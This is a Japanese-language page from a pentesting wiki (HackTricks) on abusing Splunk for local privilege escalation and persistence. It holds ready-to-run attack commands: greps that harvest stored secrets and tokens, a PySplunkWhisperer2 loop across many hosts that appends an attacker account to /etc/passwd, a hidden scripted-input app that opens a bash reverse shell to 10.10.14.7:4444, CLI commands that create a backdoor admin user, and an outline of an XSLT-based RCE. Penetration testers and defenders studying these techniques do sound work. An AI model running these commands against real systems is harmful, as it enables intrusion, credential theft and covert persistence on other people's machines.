# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

機械を**内部**または**外部**から**enumerating**していて、**Splunk running**しているのを見つけた場合（通常、Web UI は **8000**、management API は **8089**）、有効な認証情報は app installation、scripted inputs、または management actions を通じてしばしば**code execution**に変えられます。Splunk が **root** として動作している場合、それはしばしば即時の**privilege escalation**になります。

一般的な remote attack surface、enumeration、または app-upload RCE path だけが必要なら、こちらを確認してください:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

すでに **root** で、かつ Splunk service が localhost のみに listen していない場合は、**Splunk password hashes** を盗んだり、**encrypted secrets** を復元したり、**malicious app** を投入してローカルまたは複数の forwarder にまたがる persistence を維持したりできます。

## Interesting Local Files

Splunk または Splunk Universal Forwarder が動作しているホストに到達したら、通常、最も興味深いパスは次のとおりです:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
重要なアーティファクト:

- **`$SPLUNK_HOME/etc/passwd`**: ローカル Splunk ユーザーとパスワードハッシュ。
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: 複数の `.conf` ファイルに保存された secret を暗号化するために Splunk が使う key。
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 初期 admin bootstrap ファイル。gold image や provisioning のミスで有用。`etc/passwd` がすでに存在する場合は無視される。
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs が一般的に有効化される場所。
- **`$SPLUNK_HOME/etc/deployment-apps/`** または **`$SPLUNK_HOME/etc/apps/`**: persistent app を隠す、またはすでに配布されているものを確認するのに適した場所。

## Splunk Universal Forwarder Agent Exploit Summary

詳細は [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) を確認してください。これは要約です:

**Exploit overview:**
Splunk Universal Forwarder (UF) を対象にした exploit により、**agent password** を持つ攻撃者は agent 上で arbitrary code を実行でき、環境の大部分を侵害する可能性があります。

**Why it works:**

- UF management service は一般的に **TCP 8089** で公開されています。
- 攻撃者は API に認証し、forwarder に **malicious app bundle** のインストールを指示できます。
- 同じ primitive はローカルで **LPE**、リモートで **RCE** に使えます。
- **SplunkWhisperer2** のような public tooling は app bundle を自動生成し、Linux 対象向けに payload を適応できます。

**Common ways to recover the password:**

- documentation、scripts、shares、または deployment automation にある cleartext credentials。
- `$SPLUNK_HOME/etc/passwd` 内の password hashes を offline cracking。
- `user-seed.conf` のような golden image や provisioning の残骸。

**Impact:**

- 侵害された各ホストで SYSTEM/root-level の code execution。
- persistent apps、backdoors、または ransomware の配布。
- データが forwarded される前に telemetry を無効化または改ざんすること。

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**使用可能な public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs または Malicious Apps による Persistence

`root`/`splunk` として **filesystem write access** がある場合、または apps を install するための認証済み access がある場合、非常に信頼性の高い persistence mechanism は、**scripted input** を持つ **custom app** を配置することです。Splunk の公式 documentation では、scripted inputs は app directory 配下に置かれ、`inputs.conf` から enable されることが想定されています。

典型的な layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
クイック Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- 同じ手口は **Universal Forwarder** でも `/opt/splunkforwarder/etc/apps/` を使って機能する。
- 攻撃者は、露骨に悪意のある app を作る代わりに、正当な add-on を改変して目立たないように混ざることが多い。
- **deployment server** では、`deployment-apps/` 内に悪意のある app を仕込むと、forwarders が更新済み app をポーリングしてダウンロードし、適用時に再起動することが多いため、**fleet-wide persistence** になる。

## Credential Theft and Admin Takeover

Splunk のローカルファイルを読めるなら、通常は 2 つの有力な目的がある: **Splunk admin access** を回復することと、**encrypted service credentials** を回復すること。

### Password hashes and local users

Splunk はローカル認証データを `etc/passwd` に保存する。環境によっては、そのファイルを crack することで、web UI と management API の有効な credentials を回収できる。

すでに有効な **admin** credentials を持っていて、Splunk が **native** authentication backend を使っているなら、CLI 自体を persistence に使える:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` and encrypted values

Splunk は `etc/auth/splunk.secret` を使って、複数の設定ファイルに保存された機密値を保護します。**secret** と関連する **`.conf`** ファイルの両方を入手できれば、次の値を復元または再利用できることがよくあります。

- `pass4SymmKey` のような forwarder/indexer の共有 secret
- `sslPassword` のような TLS private-key のパスワード
- `bindDNPassword` のような LDAP bind credentials

これは、Splunk admin パスワード自体をクラックできない場合でも、**lateral movement** に役立ちます。

### `user-seed.conf` abuse

`user-seed.conf` は、初回起動時、または `etc/passwd` が存在しない場合にのみ使われます。そのため、稼働中の box ではあまり有用ではありませんが、次のような環境では非常に興味深いです。

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk が自動的に再初期化される appliances

そのような場合、`splunk hash-passwd` で生成した `HASHED_PASSWORD` を仕込んでおけば、再展開後に静かに admin access を取り戻せます。

## Abusing Splunk Queries

詳細は [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) を確認してください。

最近有用な technique の 1 つは、脆弱な Splunk Enterprise version における **user-supplied XSLT** を abuse し、低権限の認証済み account を **OS command execution** に変えることです。実行は `splunk` user として行われます。

全体の流れ:

1. Splunk に authenticate する。
2. preview/upload 機能を通じて悪意ある **XSL** ファイルを upload する。
3. **dispatch** ディレクトリ内のその uploaded stylesheet を使って、Splunk に search results を render させる。
4. XSLT payload を使って file を書き込むか、Splunk の search pipeline 経由で execution を trigger する（たとえば `runshellscript` のような内部機能に到達する）。

重要な offensive takeaway は、この path が **post-auth RCE without needing app upload** だという点です。Linux では通常 **`splunk`** account に到達しますが、それでも有用です。なぜなら、その user はしばしば application tree を所有し、secret を読めて、shell を失っても残る persistent apps を植え込めるからです。

exploitation 中に使われる代表的な path は次のとおりです:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk が過剰な権限で動作している場合、または `splunk` ユーザーが危険なスクリプト、書き込み可能な service units、あるいは不適切な `sudo` ルールにアクセスできる場合、これはきれいな **LPE** チェーンになります。

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
